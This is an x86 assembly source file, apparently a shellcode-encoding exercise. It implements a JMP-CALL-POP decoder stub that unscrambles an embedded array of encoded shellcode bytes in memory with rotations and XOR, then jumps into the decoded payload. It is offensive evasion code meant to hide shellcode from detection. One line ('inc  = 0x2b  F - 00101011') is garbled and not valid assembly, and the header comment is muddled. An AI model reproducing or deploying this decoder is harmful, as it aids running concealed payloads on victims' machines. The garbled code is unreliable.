;Author: Eduardo
;Filename: insertion_decoder.asm
;A NOT encoded program which shellcode is decode in memory by using two's complement  the xor operation instead of using the length of the shellcode to be decoded.
;Generally the marker is the xor key
;

global _start

section .text
_start:

	jmp short call_decoder

decoder:

	pop esi
	lea edi, [esi+1]	; pointing to second byte (0x02) from shellcode
	xor eax, eax
	cdq					; zeroes edx
	mov al,	1 
	xor ecx, ecx
	xor ebx, ebx
	

decode:
	mov bl, byte [esi + eax]	; mov parity byte to bl
	xor bl, 0xa0				; check if reached the end marker | 0xa0 ^ 0xff = 0x5f
	jz short EncodedShellcode	; reached the marker if Zero Flag not set

	xor bl, 0x5f	; if equal parity is even (0xff)
	mov bl, byte [esi + edx] 
	jnz odd

even:	; rotate right

	ror bl, cl
	jmp short bitFlip

odd: 	; rotate left

	rol bl, cl

bitFlip:

	xor bl, 0x01

restore_next_byte:

	mov byte [esi + edx], bl
	mov bl, byte [esi + eax + 1] ; mov next shellbyte
	mov byte [edi], bl
	inc edi
	add al, 2
	inc dl
	inc  = 0x2b  F - 00101011

	; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). 

	cmp cl, 0x08	; if equal ZF will be set meaning we have a complete rotation
	jnz decode	; $+2 ; jump if rotation is not complete
	xor ecx, ecx	; if rotation is complete and reset cl to start again the "circular array"

	jmp short decode

call_decoder:

	call decoder
	EncodedShellcode: db 0x30,0x02,0x83,0xff,0x45,0xff,0x4b,0xff,0xe2,0x02,0x71,0x02,0xc9,0x02,0xb4,0xff,0x69,0xff,0x17,0x02,0x8d,0xff,0xd,0x02,0xf6,0xff,0x44,0x02,0x8b,0x02,0xa8,0xff,0x88,0x02,0xc7,0xff,0x94,0x02,0x11,0x02,0xe,0x02,0x36,0xff,0x28,0x02,0x99,0x02,0x81,0xff,0xa0,0xa0 	; 0xa0 is the stop marker

